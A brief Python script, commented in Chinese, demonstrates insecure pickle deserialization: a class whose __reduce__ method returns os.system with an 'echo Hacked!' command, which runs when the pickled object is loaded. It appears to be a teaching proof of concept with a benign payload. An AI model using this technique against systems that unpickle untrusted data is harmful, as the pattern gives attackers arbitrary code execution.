import pickle
import os

# 构造恶意代码
class Malicious:
    def __reduce__(self):
        return (os.system, ('echo Hacked!',))

# 序列化恶意对象
malicious_data = pickle.dumps(Malicious())

# 反序列化时执行恶意代码
pickle.loads(malicious_data)
